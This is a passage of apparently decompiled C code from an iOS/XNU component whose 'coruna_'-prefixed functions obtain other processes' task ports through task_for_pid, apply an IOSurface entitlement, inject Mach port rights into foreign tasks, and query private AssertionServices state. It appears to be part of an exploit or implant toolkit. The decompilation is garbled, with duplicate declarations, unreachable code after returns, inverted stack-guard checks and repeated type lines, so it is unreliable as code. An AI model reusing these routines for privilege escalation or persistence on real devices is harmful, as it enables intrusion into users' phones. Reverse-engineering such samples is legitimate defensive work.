      scratch = 0;
      u = coruna_pthread_create(val[3],&thread_attr,&scratch);
      if ((int)u != 0) {
        return u;
      }
      u = coruna_apply_iosurface_entitlement(val[5],id_2);
      if ((int)u == 0) {
        host_info = 0;
        u = coruna_mach_port_deallocate(&host_info,*val,id_2,val[2],thread_attr & 0xffffffff,scratch);
        if ((int)u == 0) {
          u = coruna_run_end_last(host_info,arg,size_3,off_5,path,arg,off_4,off_6);
          coruna_mach_port_deallocate(host_info);
          return u;
        }
        return u;
      }
      return u;
    }
  }
  return 0x1e03f;
}
int * coruna_mach_port_deallocate_218cc(int *flags,uint64_t val,long handle,uint64_t id_2,char *path,
                  long addr_2,uint64_t size_3,uint64_t off_4,uint64_t off_5,
                  mach_port_name_t *arg)
{
  uint u;
  int *err;
  long *ptr;
  int *status;
  unsigned long scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long bootargs;
  
  bootargs = *(long *)k_persist_stack_chk_guard_slot;
  status = (int *)0xad001;
  err = flags;
  if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if ((int)val < 1) {
    status = (int *)0x1e03f;
    if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  status = (int *)0x1e01c;
  if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if (path == (char *)0x0) {
    status = (int *)0x1e01d;
    if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  status = (int *)0x1e01d;
  if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if (((int)size_3 != 0) && (addr_2 == 0)) {
    status = (int *)0x1e01e;
    if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  ptr = *(long **)(flags + 10);
  status = (int *)0xad001;
  if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  scratch = k_persist_rodata_word_0001efd8;
  scratch = k_persist_rodata_word_1efd0;
  thread_attr = k_persist_rodata_word_0001efe8;
  bootargs = k_persist_rodata_word_1efe0;
  status = (int *)(**(void (**)(*ptr + 0x40))(*ptr,ptr + 1,&scratch,2,0);
  err = status;
  if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  scratch = scratch & 0xffffffff00000000;
  status = (int *)coruna_task_for_pid(*(uint64_t *)(flags + 10),val,&scratch);
  if ((uint)status == 0) {
    status = (int *)coruna_pid_for_task(flags,scratch & 0xffffffff,handle,id_2,path,addr_2,
                                 size_3,off_4,off_5);
    err = status;
    if (((int)status == 0) && (arg != (mach_port_name_t *)0x0)) {
      *arg = (mach_port_name_t)scratch;
      status = (int *)0x0;
done:
      scratch = scratch & 0xffffffff00000000;
    }
    else if (1 < (mach_port_name_t)scratch + 1) {
      u = *(uint *)k_persist_mach_task_self_slot;
      err = (int *)(unsigned long)u;
      if (u != (mach_port_name_t)scratch) {
        u = _mach_port_deallocate(u,(mach_port_name_t)scratch);
        err = (int *)(unsigned long)u;
        goto done;
      }
    }
  }
  else {
    err = (int *)_csops_audittoken(val,0,0,0,1);
    if ((int)err != 0) {
      err = ___error();
      u = 0x1e03f;
      if (*err != 3) {
        u = (uint)status;
      }
      status = (int *)(unsigned long)u;
    }
  }
  ptr = *(long **)(flags + 10);
  if ((ptr != (long *)0x0) && (ptr[1] != 0)) {
    err = (int *)(**(void (**)(*ptr + 0x30))();
  }
fail:
  if (*(long *)k_persist_stack_chk_guard_slot == bootargs) {
    return status;
  }
  ___stack_chk_fail(err);
}





uint32_t coruna_parse_xnu_version(void)
{
  mach_port_t host;
  kern_return_t lk1;
  int err;
  char *ptr;
  uint32_t u;
  uint64_t scratch;
  size_t bootargs;
  char thread_attr [520];
  long host_info;
  
  host_info = *(long *)k_persist_stack_chk_guard_slot;
  u = 0xad011;
  thread_attr[0x1e8] = '\0';
  thread_attr[0x1e9] = '\0';
  thread_attr[0x1ea] = '\0';
  thread_attr[0x1eb] = '\0';
  thread_attr[0x1ec] = '\0';
  thread_attr[0x1ed] = '\0';
  thread_attr[0x1ee] = '\0';
  thread_attr[0x1ef] = '\0';
  thread_attr[0x1e0] = '\0';
  thread_attr[0x1e1] = '\0';
  thread_attr[0x1e2] = '\0';
  thread_attr[0x1e3] = '\0';
  thread_attr[0x1e4] = '\0';
  thread_attr[0x1e5] = '\0';
  thread_attr[0x1e6] = '\0';
  thread_attr[0x1e7] = '\0';
  thread_attr[0x1f8] = '\0';
  thread_attr[0x1f9] = '\0';
  thread_attr[0x1fa] = '\0';
  thread_attr[0x1fb] = '\0';
  thread_attr[0x1fc] = '\0';
  thread_attr[0x1fd] = '\0';
  thread_attr[0x1fe] = '\0';
  thread_attr[0x1ff] = '\0';
  thread_attr[0x1f0] = '\0';
  thread_attr[0x1f1] = '\0';
  thread_attr[0x1f2] = '\0';
  thread_attr[499] = '\0';
  thread_attr[500] = '\0';
  thread_attr[0x1f5] = '\0';
  thread_attr[0x1f6] = '\0';
  thread_attr[0x1f7] = '\0';
  thread_attr[0x1c8] = '\0';
  thread_attr[0x1c9] = '\0';
  thread_attr[0x1ca] = '\0';
  thread_attr[0x1cb] = '\0';
  thread_attr[0x1cc] = '\0';
  thread_attr[0x1cd] = '\0';
  thread_attr[0x1ce] = '\0';
  thread_attr[0x1cf] = '\0';
  thread_attr[0x1c0] = '\0';
  thread_attr[0x1c1] = '\0';
  thread_attr[0x1c2] = '\0';
  thread_attr[0x1c3] = '\0';
  thread_attr[0x1c4] = '\0';
  thread_attr[0x1c5] = '\0';
  thread_attr[0x1c6] = '\0';
  thread_attr[0x1c7] = '\0';
  thread_attr[0x1d8] = '\0';
  thread_attr[0x1d9] = '\0';
  thread_attr[0x1da] = '\0';
  thread_attr[0x1db] = '\0';
  thread_attr[0x1dc] = '\0';
  thread_attr[0x1dd] = '\0';
  thread_attr[0x1de] = '\0';
  thread_attr[0x1df] = '\0';
  thread_attr[0x1d0] = '\0';
  thread_attr[0x1d1] = '\0';
  thread_attr[0x1d2] = '\0';
  thread_attr[0x1d3] = '\0';
  thread_attr[0x1d4] = '\0';
  thread_attr[0x1d5] = '\0';
  thread_attr[0x1d6] = '\0';
  thread_attr[0x1d7] = '\0';
  thread_attr[0x1a8] = '\0';
  thread_attr[0x1a9] = '\0';
  thread_attr[0x1aa] = '\0';
  thread_attr[0x1ab] = '\0';
  thread_attr[0x1ac] = '\0';
  thread_attr[0x1ad] = '\0';
  thread_attr[0x1ae] = '\0';
  thread_attr[0x1af] = '\0';
  thread_attr[0x1a0] = '\0';
  thread_attr[0x1a1] = '\0';
  thread_attr[0x1a2] = '\0';
  thread_attr[0x1a3] = '\0';
  thread_attr[0x1a4] = '\0';
  thread_attr[0x1a5] = '\0';
  thread_attr[0x1a6] = '\0';
  thread_attr[0x1a7] = '\0';
  thread_attr[0x1b8] = '\0';
  thread_attr[0x1b9] = '\0';
  thread_attr[0x1ba] = '\0';
  thread_attr[0x1bb] = '\0';
  thread_attr[0x1bc] = '\0';
  thread_attr[0x1bd] = '\0';
  thread_attr[0x1be] = '\0';
  thread_attr[0x1bf] = '\0';
  thread_attr[0x1b0] = '\0';
  thread_attr[0x1b1] = '\0';
  thread_attr[0x1b2] = '\0';
  thread_attr[0x1b3] = '\0';
  thread_attr[0x1b4] = '\0';
  thread_attr[0x1b5] = '\0';
  thread_attr[0x1b6] = '\0';
  thread_attr[0x1b7] = '\0';
  thread_attr[0x188] = '\0';
  thread_attr[0x189] = '\0';
  thread_attr[0x18a] = '\0';
  thread_attr[0x18b] = '\0';
  thread_attr[0x18c] = '\0';
  thread_attr[0x18d] = '\0';
  thread_attr[0x18e] = '\0';
  thread_attr[399] = '\0';
  thread_attr[0x180] = '\0';
  thread_attr[0x181] = '\0';
  thread_attr[0x182] = '\0';
  thread_attr[0x183] = '\0';
  thread_attr[0x184] = '\0';
  thread_attr[0x185] = '\0';
  thread_attr[0x186] = '\0';
  thread_attr[0x187] = '\0';
  thread_attr[0x198] = '\0';
  thread_attr[0x199] = '\0';
  thread_attr[0x19a] = '\0';
  thread_attr[0x19b] = '\0';
  thread_attr[0x19c] = '\0';
  thread_attr[0x19d] = '\0';
  thread_attr[0x19e] = '\0';
  thread_attr[0x19f] = '\0';
  thread_attr[400] = '\0';
  thread_attr[0x191] = '\0';
  thread_attr[0x192] = '\0';
  thread_attr[0x193] = '\0';
  thread_attr[0x194] = '\0';
  thread_attr[0x195] = '\0';
  thread_attr[0x196] = '\0';
  thread_attr[0x197] = '\0';
  thread_attr[0x168] = '\0';
  thread_attr[0x169] = '\0';
  thread_attr[0x16a] = '\0';
  thread_attr[0x16b] = '\0';
  thread_attr[0x16c] = '\0';
  thread_attr[0x16d] = '\0';
  thread_attr[0x16e] = '\0';
  thread_attr[0x16f] = '\0';
  thread_attr[0x160] = '\0';
  thread_attr[0x161] = '\0';
  thread_attr[0x162] = '\0';
  thread_attr[0x163] = '\0';
  thread_attr[0x164] = '\0';
  thread_attr[0x165] = '\0';
  thread_attr[0x166] = '\0';
  thread_attr[0x167] = '\0';
  thread_attr[0x178] = '\0';
  thread_attr[0x179] = '\0';
  thread_attr[0x17a] = '\0';
  thread_attr[0x17b] = '\0';
  thread_attr[0x17c] = '\0';
  thread_attr[0x17d] = '\0';
  thread_attr[0x17e] = '\0';
  thread_attr[0x17f] = '\0';
  thread_attr[0x170] = '\0';
  thread_attr[0x171] = '\0';
  thread_attr[0x172] = '\0';
  thread_attr[0x173] = '\0';
  thread_attr[0x174] = '\0';
  thread_attr[0x175] = '\0';
  thread_attr[0x176] = '\0';
  thread_attr[0x177] = '\0';
  thread_attr[0x148] = '\0';
  thread_attr[0x149] = '\0';
  thread_attr[0x14a] = '\0';
  thread_attr[0x14b] = '\0';
  thread_attr[0x14c] = '\0';
  thread_attr[0x14d] = '\0';
  thread_attr[0x14e] = '\0';
  thread_attr[0x14f] = '\0';
  thread_attr[0x140] = '\0';
  thread_attr[0x141] = '\0';
  thread_attr[0x142] = '\0';
  thread_attr[0x143] = '\0';
  thread_attr[0x144] = '\0';
  thread_attr[0x145] = '\0';
  thread_attr[0x146] = '\0';
  thread_attr[0x147] = '\0';
  thread_attr[0x158] = '\0';
  thread_attr[0x159] = '\0';
  thread_attr[0x15a] = '\0';
  thread_attr[0x15b] = '\0';
  thread_attr[0x15c] = '\0';
  thread_attr[0x15d] = '\0';
  thread_attr[0x15e] = '\0';
  thread_attr[0x15f] = '\0';
  thread_attr[0x150] = '\0';
  thread_attr[0x151] = '\0';
  thread_attr[0x152] = '\0';
  thread_attr[0x153] = '\0';
  thread_attr[0x154] = '\0';
  thread_attr[0x155] = '\0';
  thread_attr[0x156] = '\0';
  thread_attr[0x157] = '\0';
  thread_attr[0x128] = '\0';
  thread_attr[0x129] = '\0';
  thread_attr[0x12a] = '\0';
  thread_attr[299] = '\0';
  thread_attr[300] = '\0';
  thread_attr[0x12d] = '\0';
  thread_attr[0x12e] = '\0';
  thread_attr[0x12f] = '\0';
  thread_attr[0x120] = '\0';
  thread_attr[0x121] = '\0';
  thread_attr[0x122] = '\0';
  thread_attr[0x123] = '\0';
  thread_attr[0x124] = '\0';
  thread_attr[0x125] = '\0';
  thread_attr[0x126] = '\0';
  thread_attr[0x127] = '\0';
  thread_attr[0x138] = '\0';
  thread_attr[0x139] = '\0';
  thread_attr[0x13a] = '\0';
  thread_attr[0x13b] = '\0';
  thread_attr[0x13c] = '\0';
  thread_attr[0x13d] = '\0';
  thread_attr[0x13e] = '\0';
  thread_attr[0x13f] = '\0';
  thread_attr[0x130] = '\0';
  thread_attr[0x131] = '\0';
  thread_attr[0x132] = '\0';
  thread_attr[0x133] = '\0';
  thread_attr[0x134] = '\0';
  thread_attr[0x135] = '\0';
  thread_attr[0x136] = '\0';
  thread_attr[0x137] = '\0';
  thread_attr[0x108] = '\0';
  thread_attr[0x109] = '\0';
  thread_attr[0x10a] = '\0';
  thread_attr[0x10b] = '\0';
  thread_attr[0x10c] = '\0';
  thread_attr[0x10d] = '\0';
  thread_attr[0x10e] = '\0';
  thread_attr[0x10f] = '\0';
  thread_attr[0x100] = '\0';
  thread_attr[0x101] = '\0';
  thread_attr[0x102] = '\0';
  thread_attr[0x103] = '\0';
  thread_attr[0x104] = '\0';
  thread_attr[0x105] = '\0';
  thread_attr[0x106] = '\0';
  thread_attr[0x107] = '\0';
  thread_attr[0x118] = '\0';
  thread_attr[0x119] = '\0';
  thread_attr[0x11a] = '\0';
  thread_attr[0x11b] = '\0';
  thread_attr[0x11c] = '\0';
  thread_attr[0x11d] = '\0';
  thread_attr[0x11e] = '\0';
  thread_attr[0x11f] = '\0';
  thread_attr[0x110] = '\0';
  thread_attr[0x111] = '\0';
  thread_attr[0x112] = '\0';
  thread_attr[0x113] = '\0';
  thread_attr[0x114] = '\0';
  thread_attr[0x115] = '\0';
  thread_attr[0x116] = '\0';
  thread_attr[0x117] = '\0';
  thread_attr[0xe8] = '\0';
  thread_attr[0xe9] = '\0';
  thread_attr[0xea] = '\0';
  thread_attr[0xeb] = '\0';
  thread_attr[0xec] = '\0';
  thread_attr[0xed] = '\0';
  thread_attr[0xee] = '\0';
  thread_attr[0xef] = '\0';
  thread_attr[0xe0] = '\0';
  thread_attr[0xe1] = '\0';
  thread_attr[0xe2] = '\0';
  thread_attr[0xe3] = '\0';
  thread_attr[0xe4] = '\0';
  thread_attr[0xe5] = '\0';
  thread_attr[0xe6] = '\0';
  thread_attr[0xe7] = '\0';
  thread_attr[0xf8] = '\0';
  thread_attr[0xf9] = '\0';
  thread_attr[0xfa] = '\0';
  thread_attr[0xfb] = '\0';
  thread_attr[0xfc] = '\0';
  thread_attr[0xfd] = '\0';
  thread_attr[0xfe] = '\0';
  thread_attr[0xff] = '\0';
  thread_attr[0xf0] = '\0';
  thread_attr[0xf1] = '\0';
  thread_attr[0xf2] = '\0';
  thread_attr[0xf3] = '\0';
  thread_attr[0xf4] = '\0';
  thread_attr[0xf5] = '\0';
  thread_attr[0xf6] = '\0';
  thread_attr[0xf7] = '\0';
  thread_attr[200] = '\0';
  thread_attr[0xc9] = '\0';
  thread_attr[0xca] = '\0';
  thread_attr[0xcb] = '\0';
  thread_attr[0xcc] = '\0';
  thread_attr[0xcd] = '\0';
  thread_attr[0xce] = '\0';
  thread_attr[0xcf] = '\0';
  thread_attr[0xc0] = '\0';
  thread_attr[0xc1] = '\0';
  thread_attr[0xc2] = '\0';
  thread_attr[0xc3] = '\0';
  thread_attr[0xc4] = '\0';
  thread_attr[0xc5] = '\0';
  thread_attr[0xc6] = '\0';
  thread_attr[199] = '\0';
  thread_attr[0xd8] = '\0';
  thread_attr[0xd9] = '\0';
  thread_attr[0xda] = '\0';
  thread_attr[0xdb] = '\0';
  thread_attr[0xdc] = '\0';
  thread_attr[0xdd] = '\0';
  thread_attr[0xde] = '\0';
  thread_attr[0xdf] = '\0';
  thread_attr[0xd0] = '\0';
  thread_attr[0xd1] = '\0';
  thread_attr[0xd2] = '\0';
  thread_attr[0xd3] = '\0';
  thread_attr[0xd4] = '\0';
  thread_attr[0xd5] = '\0';
  thread_attr[0xd6] = '\0';
  thread_attr[0xd7] = '\0';
  thread_attr[0xa8] = '\0';
  thread_attr[0xa9] = '\0';
  thread_attr[0xaa] = '\0';
  thread_attr[0xab] = '\0';
  thread_attr[0xac] = '\0';
  thread_attr[0xad] = '\0';
  thread_attr[0xae] = '\0';
  thread_attr[0xaf] = '\0';
  thread_attr[0xa0] = '\0';
  thread_attr[0xa1] = '\0';
  thread_attr[0xa2] = '\0';
  thread_attr[0xa3] = '\0';
  thread_attr[0xa4] = '\0';
  thread_attr[0xa5] = '\0';
  thread_attr[0xa6] = '\0';
  thread_attr[0xa7] = '\0';
  thread_attr[0xb8] = '\0';
  thread_attr[0xb9] = '\0';
  thread_attr[0xba] = '\0';
  thread_attr[0xbb] = '\0';
  thread_attr[0xbc] = '\0';
  thread_attr[0xbd] = '\0';
  thread_attr[0xbe] = '\0';
  thread_attr[0xbf] = '\0';
  thread_attr[0xb0] = '\0';
  thread_attr[0xb1] = '\0';
  thread_attr[0xb2] = '\0';
  thread_attr[0xb3] = '\0';
  thread_attr[0xb4] = '\0';
  thread_attr[0xb5] = '\0';
  thread_attr[0xb6] = '\0';
  thread_attr[0xb7] = '\0';
  thread_attr[0x88] = '\0';
  thread_attr[0x89] = '\0';
  thread_attr[0x8a] = '\0';
  thread_attr[0x8b] = '\0';
  thread_attr[0x8c] = '\0';
  thread_attr[0x8d] = '\0';
  thread_attr[0x8e] = '\0';
  thread_attr[0x8f] = '\0';
  thread_attr[0x80] = '\0';
  thread_attr[0x81] = '\0';
  thread_attr[0x82] = '\0';
  thread_attr[0x83] = '\0';
  thread_attr[0x84] = '\0';
  thread_attr[0x85] = '\0';
  thread_attr[0x86] = '\0';
  thread_attr[0x87] = '\0';
  thread_attr[0x98] = '\0';
  thread_attr[0x99] = '\0';
  thread_attr[0x9a] = '\0';
  thread_attr[0x9b] = '\0';
  thread_attr[0x9c] = '\0';
  thread_attr[0x9d] = '\0';
  thread_attr[0x9e] = '\0';
  thread_attr[0x9f] = '\0';
  thread_attr[0x90] = '\0';
  thread_attr[0x91] = '\0';
  thread_attr[0x92] = '\0';
  thread_attr[0x93] = '\0';
  thread_attr[0x94] = '\0';
  thread_attr[0x95] = '\0';
  thread_attr[0x96] = '\0';
  thread_attr[0x97] = '\0';
  thread_attr[0x68] = '\0';
  thread_attr[0x69] = '\0';
  thread_attr[0x6a] = '\0';
  thread_attr[0x6b] = '\0';
  thread_attr[0x6c] = '\0';
  thread_attr[0x6d] = '\0';
  thread_attr[0x6e] = '\0';
  thread_attr[0x6f] = '\0';
  thread_attr[0x60] = '\0';
  thread_attr[0x61] = '\0';
  thread_attr[0x62] = '\0';
  thread_attr[99] = '\0';
  thread_attr[100] = '\0';
  thread_attr[0x65] = '\0';
  thread_attr[0x66] = '\0';
  thread_attr[0x67] = '\0';
  thread_attr[0x78] = '\0';
  thread_attr[0x79] = '\0';
  thread_attr[0x7a] = '\0';
  thread_attr[0x7b] = '\0';
  thread_attr[0x7c] = '\0';
  thread_attr[0x7d] = '\0';
  thread_attr[0x7e] = '\0';
  thread_attr[0x7f] = '\0';
  thread_attr[0x70] = '\0';
  thread_attr[0x71] = '\0';
  thread_attr[0x72] = '\0';
  thread_attr[0x73] = '\0';
  thread_attr[0x74] = '\0';
  thread_attr[0x75] = '\0';
  thread_attr[0x76] = '\0';
  thread_attr[0x77] = '\0';
  thread_attr[0x48] = '\0';
  thread_attr[0x49] = '\0';
  thread_attr[0x4a] = '\0';
  thread_attr[0x4b] = '\0';
  thread_attr[0x4c] = '\0';
  thread_attr[0x4d] = '\0';
  thread_attr[0x4e] = '\0';
  thread_attr[0x4f] = '\0';
  thread_attr[0x40] = '\0';
  thread_attr[0x41] = '\0';
  thread_attr[0x42] = '\0';
  thread_attr[0x43] = '\0';
  thread_attr[0x44] = '\0';
  thread_attr[0x45] = '\0';
  thread_attr[0x46] = '\0';
  thread_attr[0x47] = '\0';
  thread_attr[0x58] = '\0';
  thread_attr[0x59] = '\0';
  thread_attr[0x5a] = '\0';
  thread_attr[0x5b] = '\0';
  thread_attr[0x5c] = '\0';
  thread_attr[0x5d] = '\0';
  thread_attr[0x5e] = '\0';
  thread_attr[0x5f] = '\0';
  thread_attr[0x50] = '\0';
  thread_attr[0x51] = '\0';
  thread_attr[0x52] = '\0';
  thread_attr[0x53] = '\0';
  thread_attr[0x54] = '\0';
  thread_attr[0x55] = '\0';
  thread_attr[0x56] = '\0';
  thread_attr[0x57] = '\0';
  thread_attr[0x28] = '\0';
  thread_attr[0x29] = '\0';
  thread_attr[0x2a] = '\0';
  thread_attr[0x2b] = '\0';
  thread_attr[0x2c] = '\0';
  thread_attr[0x2d] = '\0';
  thread_attr[0x2e] = '\0';
  thread_attr[0x2f] = '\0';
  thread_attr[0x20] = '\0';
  thread_attr[0x21] = '\0';
  thread_attr[0x22] = '\0';
  thread_attr[0x23] = '\0';
  thread_attr[0x24] = '\0';
  thread_attr[0x25] = '\0';
  thread_attr[0x26] = '\0';
  thread_attr[0x27] = '\0';
  thread_attr[0x38] = '\0';
  thread_attr[0x39] = '\0';
  thread_attr[0x3a] = '\0';
  thread_attr[0x3b] = '\0';
  thread_attr[0x3c] = '\0';
  thread_attr[0x3d] = '\0';
  thread_attr[0x3e] = '\0';
  thread_attr[0x3f] = '\0';
  thread_attr[0x30] = '\0';
  thread_attr[0x31] = '\0';
  thread_attr[0x32] = '\0';
  thread_attr[0x33] = '\0';
  thread_attr[0x34] = '\0';
  thread_attr[0x35] = '\0';
  thread_attr[0x36] = '\0';
  thread_attr[0x37] = '\0';
  thread_attr[8] = '\0';
  thread_attr[9] = '\0';
  thread_attr[10] = '\0';
  thread_attr[0xb] = '\0';
  thread_attr[0xc] = '\0';
  thread_attr[0xd] = '\0';
  thread_attr[0xe] = '\0';
  thread_attr[0xf] = '\0';
  thread_attr[0] = '\0';
  thread_attr[1] = '\0';
  thread_attr[2] = '\0';
  thread_attr[3] = '\0';
  thread_attr[4] = '\0';
  thread_attr[5] = '\0';
  thread_attr[6] = '\0';
  thread_attr[7] = '\0';
  thread_attr[0x18] = '\0';
  thread_attr[0x19] = '\0';
  thread_attr[0x1a] = '\0';
  thread_attr[0x1b] = '\0';
  thread_attr[0x1c] = '\0';
  thread_attr[0x1d] = '\0';
  thread_attr[0x1e] = '\0';
  thread_attr[0x1f] = '\0';
  thread_attr[0x10] = '\0';
  thread_attr[0x11] = '\0';
  thread_attr[0x12] = '\0';
  thread_attr[0x13] = '\0';
  thread_attr[0x14] = '\0';
  thread_attr[0x15] = '\0';
  thread_attr[0x16] = '\0';
  thread_attr[0x17] = '\0';
  host = _mach_host_self();
  lk1 = _host_kernel_version(host,thread_attr);
  if (lk1 != 0) {
    if (*(long *)k_persist_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
    }
    return u;
    scratch = k_persist_rodata_word_1efa8;
    bootargs = 0x200;
    err = _sysctl((int *)&scratch,2,thread_attr,&bootargs,(void *)0x0,0);
    if (*(long *)k_persist_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
    }
    return u;
  }
  ptr = _strstr(thread_attr,"xnu-");
  if (ptr != (char *)0x0) {
    err = _sscanf(ptr + 4,"%u.%u.%u");
    u = 0;
    if (err != 3) {
      u = 0xad011;
    }
  }
fail:
  if (*(long *)k_persist_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
  }
  return u;
}





uint64_t coruna_init_bks_app_state(long *handle)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  uint64_t u;
  
  u = 0;
  if (handle != (long *)0x0) {
    handle[1] = 0;
    *handle = 0;
    handle[3] = 0;
    handle[2] = 0;
    handle = _dlopen("/System/Library/PrivateFrameworks/AssertionServices.framework/AssertionServices"
                    ,10);
    if (handle == 0) {
      u = 1;
    }
    else {
      addr = _objc_getClass("BKSApplicationStateMonitor");
      off = _sel_registerName("alloc");
      base = _sel_registerName("init");
      ctx_val = _sel_registerName("release");
      serial = _sel_registerName("mostElevatedApplicationStateForPID:");
      if ((((((addr != 0) && (off != 0)) && (base != 0)) && ((ctx_val != 0 && (serial != 0)))) &&
          ((err = _class_respondsToSelector(addr,base), err != 0 &&
           ((err = _class_respondsToSelector(addr,serial), err != 0 &&
            (err = _class_respondsToSelector(addr,ctx_val), err != 0)))))) &&
         (addr = _objc_msgSend(addr,off), addr != 0)) {
        off = _objc_msgSend(addr,base);
        if (off != 0) {
          *handle = handle;
          handle[1] = addr;
          handle[2] = ctx_val;
          handle[3] = serial;
          return 1;
        }
        _objc_msgSend(addr,ctx_val);
      }
      _dlclose(handle);
      u = 0;
    }
  }
  return u;
}





bool coruna_objc_msgsend(long *handle)
{
  if (handle != (long *)0x0) {
    if ((handle[1] != 0) && (handle[2] != 0)) {
      _objc_msgSend();
    }
    if (*handle != 0) {
      _dlclose();
    }
    handle[1] = 0;
    *handle = 0;
    handle[3] = 0;
    handle[2] = 0;
  }
  return handle != (long *)0x0;
}





uint64_t coruna_objc_msgsend_iface(long handle,uint64_t val)
{
  uint64_t u;
  
  if ((((handle != 0) && (0 < (int)val)) && (*(long *)(handle + 8) != 0)) &&
     (*(long *)(handle + 0x18) != 0)) {
    u = _objc_msgSend(*(long *)(handle + 8),*(long *)(handle + 0x18),val);
    return u;
  }
  return 0;
}





uint64_t coruna_calloc(uint64_t *val)
{
  int err;
  void *ptr;
  uint64_t u;
  
  u = 0;
  if ((val != (uint64_t *)0x0) && (ptr = _calloc(1,0x20), u = 0, ptr != (void *)0x0)
     ) {
    err = coruna_init_bks_app_state();
    if (err == 0) {
      _free(ptr);
      u = 0;
    }
    else {
      *val = ptr;
      u = 1;
    }
  }
  return u;
}





uint32_t
uint32_t coruna_mach_msg_send(mach_port_t port,mach_msg_header_t *arg,mach_msg_size_t arg_x, mach_msg_timeout_t arg_x_x,int flags)
{
  mach_msg_return_t lm1;
  uint32_t u;
  
  u = 0xad001;
  if (((arg != (mach_msg_header_t *)0x0) && (arg_x != 0)) &&
     (u = 0x1e01b, 1 < port + 1)) {
    arg->msgh_bits = 0x13;
    arg->msgh_size = arg_x;
    arg->msgh_local_port = 0;
    arg->msgh_reserved = 0;
    arg->msgh_remote_port = port;
    if (flags != 0) {
      arg->msgh_bits = 0x80000013;
    }
    lm1 = _mach_msg(arg,0x11,arg_x,0,0,arg_x_x,0);
    if (lm1 == 0) {
      u = 0;
    }
    else if (lm1 == 0x10000004) {
      _mach_msg_destroy(arg);
      u = 0x1e030;
    }
    else {
      u = 0x1e025;
      if (lm1 == 0x10000003) {
        u = 0x1e02f;
      }
    }
  }
  return u;
}





uint32_t
uint32_t coruna_mach_msg_recv(mach_port_name_t arg,int flags,uint size,mach_msg_header_t *arg_x, mach_msg_timeout_t arg_x_x)
{
  uint u;
  uint32_t size;
  
  if (arg_x == (mach_msg_header_t *)0x0) {
    return 0xad001;
  }
  if (size == 0) {
    return 0xad001;
  }
  size = 0x1e021;
  if (arg + 1 < 2) {
    return 0x1e01b;
  }
  _bzero(arg_x,(unsigned long)size);
  arg_x->msgh_remote_port = arg;
  arg_x->msgh_local_port = arg;
  arg_x->msgh_bits = 0x13;
  arg_x->msgh_size = size;
  u = _mach_msg(arg_x,0x102,0,size,arg,arg_x_x,0);
  if ((int)u < 0x10004003) {
    if (u == 0) {
      if (arg_x->msgh_id == flags) {
        if (-1 < (int)arg_x->msgh_bits) {
          return 0;
        }
        size = 0x1e019;
      }
      else {
        size = 0x1e03d;
      }
      _mach_msg_destroy(arg_x);
      return size;
    }
    if (u == 0x10004002) {
      return 0x1e031;
    }
  }
  else {
    if (u == 0x10004003) {
      return 0x1e02a;
    }
    if (u == 0x10004004) {
      if (arg_x->msgh_id == flags) {
        return 0x1e021;
      }
      return 0x1e03d;
    }
  }
  if ((u & 0xfffffffb) != 0x10004008) {
    return 0x1e021;
  }
fail:
  _mach_msg_destroy(arg_x);
  return size;
}





uint64_t coruna_mach_port_allocate(mach_port_name_t *arg,uint64_t val)
{
  uint8_t *ptr;
  kern_return_t lk2;
  uint64_t u;
  mach_port_name_t scratch;
  
  ptr = k_persist_mach_task_self_slot;
  if (arg == (mach_port_name_t *)0x0) {
    u = 0xad001;
  }
  else {
    scratch = 0;
    lk2 = _mach_port_allocate(*(ipc_space_t *)k_persist_mach_task_self_slot,1,&scratch);
    if (lk2 == 0) {
      if (((int)val == 0) || (u = coruna_mach_port_set_attributes(scratch,val), (int)u == 0)) {
        u = 0;
        *arg = scratch;
      }
      else {
        _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
      }
    }
    else {
      u = 0x1e023;
    }
  }
  return u;
}





uint32_t coruna_mach_port_set_attributes(mach_port_name_t arg,integer_t arg_x)
{
  uint32_t u;
  kern_return_t lk2;
  integer_t scratch [2];
  
  u = 0x1e01b;
  if (1 < arg + 1) {
    scratch[0] = arg_x;
    lk2 = _mach_port_set_attributes
                      (*(ipc_space_t *)k_persist_mach_task_self_slot,arg,1,scratch,1);
    u = 0;
    if (lk2 != 0) {
      u = 0x1e032;
    }
  }
  return u;
}





uint64_t coruna_mach_port_insert_right(mach_port_t port,ipc_space_t arg,mach_port_name_t *arg_x)
{
  uint8_t *ptr;
  mach_port_name_t lm2;
  kern_return_t lk3;
  uint64_t u;
  int err;
  mach_port_name_t scratch;
  
  ptr = k_persist_mach_task_self_slot;
  if (arg_x == (mach_port_name_t *)0x0) {
    u = 0xad001;
  }
  else {
    u = 0x1e009;
    if (port + 1 < 2) {
      u = 0x1e01b;
    }
    else if (1 < arg + 1) {
      err = 8;
      do {
        scratch = 0;
        lm2 = port;
        if (*(ipc_space_t *)ptr != arg) {
          lk3 = _mach_port_allocate(arg,1,&scratch);
          if (lk3 != 0) {
            return 0x1e035;
          }
          lk3 = _mach_port_destroy(arg,scratch);
          lm2 = scratch;
          if (lk3 != 0) {
            return 0x1e034;
          }
        }
        scratch = lm2;
        lk3 = _mach_port_insert_right(arg,scratch,port,0x14);
        if ((lk3 == 0) || (*(ipc_space_t *)ptr == arg && lk3 == 0x15)) {
          *arg_x = scratch;
          return 0;
        }
        _usleep(100);
        err = err + -1;
      } while (err != 0);
      u = 0x1e033;
    }
  }
  return u;
}





int coruna_fixup_ctx_clear(uint64_t *val)
{
  int err;
  int status;
  
  if (val != (uint64_t *)0x0) {
    err = coruna_vec_free(val + 2,1);
